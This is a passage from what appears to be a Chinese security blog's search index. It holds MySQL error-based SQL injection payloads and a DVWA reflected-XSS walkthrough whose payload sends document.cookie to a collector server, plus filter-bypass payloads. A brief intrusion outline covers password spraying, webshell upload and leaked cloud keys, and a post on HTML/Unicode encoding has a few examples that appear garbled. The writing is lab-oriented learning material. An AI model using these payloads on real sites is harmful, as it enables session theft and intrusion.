color=maroon>4.floor（8.x>mysql>5.0）</font>\n\n`or (select 1 from (select count(*),concat(0x7e,(),0x7e,floor(rand(0) * 2))x from information_schema.tables group by x)a)--+`\n\n<font color=maroon>5.ST_Pointfromgeohash (mysql>=5.7)</font>\n\n`or ST_PointFromGeoHash((),1)--+`\n\n<font color=maroon>6.updatexml</font>\n\n`and updatexml(1,concat(0x7e,(),0x7e),1) --+`一共可以接收三个参数，报错位置在第二个参数.\n\n<font color=maroon>7.extractvalue</font>\n\n`and extractvalue(1,concat(0x7e,())) --+`一共可以接收两个参数，报错位置在第二个参数\n","tags":["sql"],"categories":["web安全"]},{"title":"XSS反射型注入利用","url":"/2025/07/13/XSS反射型注入利用/","content":"\nXSS主要原因： 过于信任客户端提交的数据！\n\n<!--more-->\n\nXSS主要分类：\n反射型xss攻击（Reflected XSS） 又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。\n\n存储型XSS（Stored XSS) 又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大, 因为每当用户打开页面，查看内容时脚本将自动执行。谷歌的orkut曾经就遭受到XSS。\n\nDOM型XSS，对于DOM型其实和反射性很像，也是能够在网页上快速的进行反映。只是参数是直接传入DOM树使用js来进行执行，只是可以在payload前加“#”，从而使其不发送到服务器端，只发送到浏览器，同样也可以使用img标签代替script标签执行JavaScript脚本。这里暂时不会介绍太多。\n\n\n\n\n\n对于反射性比较经典的利用是cookie劫持。比如我们发现了一个反射性xss，它是通过get或者post进行工作，然后我们先搭建一个远程服务器，然后利用反射性重定向至我们的服务器的脚本记录下当前用户访问的cookie进行劫持。\n自然，这样的难度比较高，首先由于入侵的反射是在response中，那么首先需要诱导用户发起request，建议可以进行一些社工诱导并且进行短链接变换。\n\n还有就是从社工的思路来操作，比如点击链接后说“请登陆我们的新站点”\n\n后面当然也有beef的钩子之类的，不过要让用户自己点击，难度还是不小\n\n对于储存型，一旦出现这样的漏洞是非常危险的，储存在服务器上可以长期对访问用户进行攻击。\n\n\n\n# XSS渗透思路\n\n## 反射型（owasp-low）\n\n首先进行弹窗探测：`<script>alert('xss')</script>`\n查看当前cookie：`<script>alert(document.cookie)</script>`\n\n![image-20250713014645185](XSS反射型注入利用/image-20250713014645185.png)\n\n探测成功，发现反射性漏洞。\n接下来进行`cookie`劫持示例：\n首先先开个攻击者服务器：\n（这里我就开了自己的一个服务器，index是显示php版本）\n\n![image-20250713014721635](XSS反射型注入利用/image-20250713014721635.png)\n\n\n\n在服务器上写一个脚本：\n\n![image-20250713014733790](XSS反射型注入利用/image-20250713014733790.png)\n\n\n\n然后植入到xss点：\n\n```\n<script>window.open(\"http://127.0.0.1/cookie.php?cookie=\"+document.cookie)</script>\n```\n\n植入之后就是：\n\n```\nhttp://172.20.240.17/dvwa/vulnerabilities/xss_r/?name=<script>window.open(\"http://127.0.0.1/cookie.php?cookie=\"+document.cookie)</script>\n```\n\n当然你可以先`url`编码，一旦点击就能够劫持出`cookie`。\n值得一提的是很多浏览器的安全策略会禁止不信任的网站弹窗，这种方法的局限性较大，并且url不经过短链接变换是非常可疑的。\n\n打开空白页，触发脚本（已允许弹窗）\n\n![image-20250713014831300](XSS反射型注入利用/image-20250713014831300.png)\n\n\n\n\n\n服务器端捕捉到`cookie`：\n\n![image-20250713014852088](XSS反射型注入利用/image-20250713014852088.png)\n\n\n\n这里多点了几次 [^_^]\n这里的利用就到这里\n\n## 反射型（owasp-mid）\n\n探测不起作用了，看看源码：\n\n```\n <?php if(!array_key_exists (\"name\", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){  \n \t$isempty = true; \n } else { \n \techo '<pre>'; \n\techo 'Hello ' . str_replace('<script>', '', $_GET['name']); \n \techo '</pre>';  \n } \n ?> \n```\n\n这里就是一个`str_replace()`过滤，显然可以使用双写绕过\npayload:\n\n`<scrip<script>t>alert('xss')</script>`\n\n成功绕过：\n\n![image-20250713015058719](XSS反射型注入利用/image-20250713015058719.png)\n\n## 反射型（owasp-high）\n\n由于版本问题，我这里已经是修复好的。\n下面是我找到的（应该是版本问题）\n\n![image-20250713015145745](XSS反射型注入利用/image-20250713015145745.png)\n\n\n\n这里就是使用正则进行替换，显然script完全不能使用了。\n但是能加载`js`脚本的标签不只有`<script>`,还有`<img>,<iframe>`\n\n`<img src=\"\" οnerrοr=\"alert('xss')\">`\n\n就像这样，利用`onerror`工作就行。\n这里给出我的版本，是这样：\n\n```\n <?php\n    \nif(!array_key_exists (\"name\", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){\n    \n $isempty = true;\n        \n} else {\n    \n echo '<pre>';\n echo 'Hello ' . htmlspecialchars($_GET['name']);\n echo '</pre>';\n        \n}\n\n?> \n```\n\n这里使用了一个关键的函数`htmlspecialchars()`\n来看看吧；\n\n![image-20250713015300561](XSS反射型注入利用/image-20250713015300561.png)\n\n\n\n![image-20250713015307385](XSS反射型注入利用/image-20250713015307385.png)\n\n这里我们可以注意到 `'`单引号 默认情况下是 没有转换为实体的 所以有些时候我们也可以利用这一点来进行绕过闭合\n\n这里多说一点，HTML实体编码 就是，将html可以解析的代码实体化，转化为字符，导致浏览器不能进行解析\n\n\n\n能够转化为实体，大大提高了安全性。 注意设置**`ENT_QUOTES`**  参数","tags":["XSS"],"categories":["web安全"]},{"title":"渗透的基本思路","url":"/2025/07/13/渗透的基本思路/","content":"\n## 入侵基本流程\n\n\n\n1.收集资产   （子域名，小程序，等）\n\n2.一般从分站入手，比如测试站点，从测试站通过弱口令爆破（密码喷洒），接口泄露等 进入后台，看是否有文件上传，文件包含等利用点，能上传webshell，从而拿到网站源码\n\n3.代码审计，找到可利用的点，对主站进行渗透\n\n4.或者可以找到AK,SK，等等 都可以进行利用\n\n\n\n","categories":["web安全"]},{"title":"url编码，unicode编码，html实体化编码","url":"/2025/07/13/url编码，unicode编码，html实体化编码/","content":"\n## [HTML实体编码和Unicode]\t\t\t\t\n\n<!--more-->\n\n\n\nHTML实体编码和Unicode是处理字符和符号的两种常见方法。HTML实体编码用于在HTML文档中显示特殊字符，而Unicode是一种将字符映射为数字的标准。\n\nHTML实体编码\n\nHTML实体编码是一种用特殊字符代替正常字符的方法，以确保在HTML文档中正确显示这些字符。HTML实体以“&”符号开始，以“;”符号结束。例如，HTML实体“<”代表“<”字符，“&”代表“&”字符。\n\n关键字实体\n\n关键字实体涵盖了最常见的字符，并且被大多数浏览器所识别。例如：\n\n```\n© <!-- 版权符号，产生© -->\n\n™ <!-- 商标符号，产生™ -->\n\n° <!-- 度，产生° -->\n```\n\n十进制实体\n\n并非每个字符都有一个关键字实体。每个字符还具有一个十进制实体：用数字编写的代码。例如：\n\n```\n↺ <!-- 空心圆顺时针箭头，产生↺ -->\n\n⇨ <!-- 右白色箭头，产生⇨ -->\n```\n\nUnicode\n\nUnicode是一种将字符映射为数字的标准。每个字符都有一个唯一的Unicode编码值。例如，字母“A”的Unicode编码值是65，数字“1”的Unicode编码值是49。Unicode兼容多种语言和字符集，使得不同的文本可以在不同的计算机系统和软件中正确显示。\n\n将HTML实体转换为Unicode编码\n\n要将HTML实体转换为Unicode编码，可以使用HTML解码器或函数。以下是一个使用Python的例子：\n\n```\nimport html\n\n\n\nhtml_entity = \"<p>Hello, World!</p>\"\n\nunicode_text = html.unescape(html_entity)\n\nprint(unicode_text) # 输出 <p>Hello, World!</p>\n```\n\n将Unicode编码转换为HTML实体\n\n同样地，要将Unicode编码转换为HTML实体，可以使用HTML编码器或函数。以下是一个使用Python的例子：\n\n```\nimport html\n\n\n\ntext = \"<p>Hello, World!</p>\"\n\nhtml_entity = html.escape(text)\n\nprint(html_entity) # 输出 <p>Hello, World!</p>\n```\n\n\n\n通过了解和掌握HTML实体和Unicode编码的转换方法，可以在处理HTML文档时正确显示特殊字符。无论是在网页开发还是在处理HTML文本的应用中，这些知识都是非常重要的。\n\n这些编码都跟ASCII码有着密不可分的关系\n\n\n\n\n\n浏览器解析顺序\n\nHTML实体编码 -> urlencode -> js unicode\n\n在urlencode 或者decode 的时候  不能编码协议\n","tags":["编码"],"categories":["web安全"]}]